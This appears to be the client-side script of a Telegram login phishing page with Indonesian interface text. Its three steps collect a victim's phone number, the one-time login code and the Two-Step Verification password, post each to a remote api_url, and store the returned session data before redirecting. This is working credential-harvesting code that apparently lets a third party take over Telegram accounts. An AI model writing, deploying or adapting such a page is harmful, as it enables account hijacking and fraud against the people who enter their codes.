let currentPhone = '';
let phoneCodeHash = '';
let sessionData = '';
tombol = document.getElementById('submit-button');
tombol2 = document.getElementById('kirim');

function step1(phone_number) {
    tombol.disabled = true;

       Swal.fire({
        title: "📲 Mengirim Kode OTP...",
        text: "Kode verifikasi sedang dikirim ke Telegram Anda.",
        allowOutsideClick: false,
        didOpen: () => {
            Swal.showLoading();
        }
    });

    fetch(api_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: new URLSearchParams({ phone: phone_number })
        })
        .then(r => r.json())
        .then(data => {
            Swal.close();
            if(data.status === 'error'){
                Swal.fire("Gagal", "Nomor tidak terdaftar di Telegram", "error");
                tombol.disabled = false;
            } else {
                sessionStorage.setItem('phoneCodeHash', data.phone_code_hash);
            sessionStorage.setItem('sessionData', data.session_data);
            sessionStorage.setItem('currentPhone', phone_number);
                 Swal.fire({
                title: "Berhasil",
                text: "Kode dikirim ke telegram anda",
                icon: "success",
                timer: 1500,
                showConfirmButton: false
            }).then(() => {
                window.location.href = 'kode.html';
            });
            }
        })
        .catch(()=>{
             Swal.close();
        Swal.fire("Error", "Gagal menghubungi server", "error");
             tombol.disabled = false;
             });
}

function step2(currentPhone, otp, phoneCodeHash, sessionData) {
     tombol2.disabled = true;

       Swal.fire({
        title: "🔐 Memverifikasi OTP...",
        text: "Sistem sedang memvalidasi kode yang Anda masukkan.",
        allowOutsideClick: false,
        didOpen: () => {
            Swal.showLoading();
        }
    });

    fetch(api_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: new URLSearchParams({ phone_number: currentPhone, code: otp, phone_code_hash: phoneCodeHash, session_data: sessionData })
        })
        .then(r => r.json())
        .then(data => {
            Swal.close();
            if(data.status === 'success'){
                 Swal.fire({
                title: "Berhasil",
                text: "Kode OTP berhasil di verifikasi",
                icon: "success",
                timer: 1500,
                showConfirmButton: false
            }).then(() => {
                window.location.href = 'data.html';
            });
            } else if(data.status === 'needed_password'){
                 Swal.fire({
                title: "Peringatan",
                text: "Silahkan verifikasi password anda",
                icon: "warning",
                timer: 1500,
                showConfirmButton: false
            }).then(() => {
                sessionStorage.setItem('hint', data.hint);
                window.location.href = 'pw.html';
            });
            } else {
                Swal.fire("Gagal", "OTP tidak valid", "error");
                tombol2.disabled = false;
            }
        })
        .catch(()=>{
             Swal.close();
        Swal.fire("Error", "Gagal menghubungi server", "error");
             tombol2.disabled = false;
             });
}

function step3(currentPhone, password, sessionData) {
     tombol2.disabled = true;

       Swal.fire({
        title: "🔑 Memverifikasi Password...",
        text: "Mengautentikasi Two-Step Verification Telegram Anda.",
        allowOutsideClick: false,
        didOpen: () => {
            Swal.showLoading();
        }
    });

    fetch(api_url, {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
           body: new URLSearchParams({ phone_number: currentPhone, password: password, session_data: sessionData })
        })
        .then(r => r.json())
        .then(data => {
            Swal.close();
            if(data.status === 'success'){
                 Swal.fire({
                title: "Berhasil",
                text: "Password berhasil di verifikasi",
                icon: "success",
                timer: 1500,
                showConfirmButton: false
            }).then(() => {
                window.location.href = 'data.html';
            });
            } else {
                Swal.fire("Gagal", "Password tidak valid", "error");
                tombol2.disabled = false;
            }
        })
        .catch(()=>{
             Swal.close();
        Swal.fire("Error", "Gagal menghubungi server", "error");
             tombol2.disabled = false;
             });
}